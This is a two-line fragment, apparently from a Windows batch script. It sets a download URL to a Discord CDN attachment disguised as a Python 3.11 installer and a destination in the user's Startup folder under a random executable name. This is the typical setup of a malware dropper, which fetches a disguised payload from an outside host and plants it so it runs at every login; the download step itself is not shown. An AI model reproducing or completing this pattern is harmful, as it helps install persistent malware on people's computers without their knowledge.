...
set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205650256671543296/python-3.11.0-amd64.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rcprvxeazuqpldsp.exe"
